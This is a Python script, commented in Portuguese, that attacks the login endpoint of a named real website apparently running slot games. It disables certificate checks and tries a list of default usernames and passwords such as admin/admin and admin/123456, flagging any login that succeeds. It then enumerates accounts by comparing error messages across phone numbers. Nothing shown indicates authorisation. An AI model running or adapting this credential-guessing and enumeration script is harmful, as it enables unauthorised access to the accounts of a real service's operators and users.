"""
Testa o endpoint real de login com os parâmetros corretos descobertos no bundle.
Endpoint: POST /prod-api/player/sign-in
"""
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def post(url, data):
    body = json.dumps(data).encode()
    h = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/json",
    }
    try:
        r = urllib.request.Request(url, data=body, headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(4096).decode("utf-8", "ignore")
            return resp.status, dict(resp.headers), raw
    except urllib.error.HTTPError as e:
        raw = e.read(2048).decode("utf-8", "ignore")
        return e.code, {}, raw
    except Exception as ex:
        return 0, {}, str(ex)

BASE = "https://ds.amizade777.com"
URL_LOGIN = f"{BASE}/prod-api/player/sign-in"

# Payload base descoberto no bundle
def payload_login(phone, password):
    return {
        "appChannel": "pc",
        "appPackageName": "com.slots.big",
        "deviceId": "",
        "deviceModel": "WEB",
        "deviceVersion": "WEB",
        "appVersion": "1.0.0",
        "sysTimezone": None,
        "sysLanguage": None,
        "phone": phone,
        "password": password,
    }

print("="*55)
print(f"TESTANDO LOGIN: {URL_LOGIN}")
print("="*55)

# Credenciais a testar
testes = [
    ("admin",        "admin"),
    ("admin",        "123456"),
    ("admin",        "admin123"),
    ("admin",        "password"),
    ("test",         "test"),
    ("test",         "123456"),
    ("13800000000",  "123456"),
    ("13800000001",  "123456"),
    ("10000000000",  "123456"),
    ("admin@admin",  "admin"),
    ("1",            "1"),
    ("admin",        ""),
    ("",             ""),
]

for phone, pwd in testes:
    st, headers, body = post(URL_LOGIN, payload_login(phone, pwd))
    try:
        j = json.loads(body)
        print(f"  [{st}] phone={phone!r} pwd={pwd!r}")
        print(f"         -> code={j.get('code')} msg={j.get('msg','')!r}")
        # Se code=200 ou tiver token, é sucesso!
        if j.get("code") == 200 or "token" in body.lower():
            print("  *** LOGIN BEM-SUCEDIDO! ***")
            print(f"  Resposta completa: {json.dumps(j, ensure_ascii=False)[:500]}")
    except:
        print(f"  [{st}] phone={phone!r} pwd={pwd!r} -> {body[:100]}")

# Teste de enumeração de usuários (mensagens de erro diferentes = usuário existe)
print("\n\n[Enumeração de usuários — mensagens de erro diferentes revelam usuários existentes]")
print("="*55)
respostas = {}
for phone in ["13800000000", "13800000001", "99999999999", "00000000000", "admin", "1234567890"]:
    st, _, body = post(URL_LOGIN, payload_login(phone, "senha_errada_xyz"))
    try:
        j = json.loads(body)
        msg = j.get("msg", "")
    except:
        msg = body[:50]
    respostas[phone] = msg
    print(f"  {phone}: {msg!r}")

# Mensagens diferentes = usuário existe vs. não existe
msgs_unicas = set(respostas.values())
if len(msgs_unicas) > 1:
    print("\n  [!] ATENÇÃO: mensagens diferentes por telefone = enumeração de usuários possível!")
else:
    print("\n  Mensagem uniforme — enumeração de usuários não detectada por este método.")
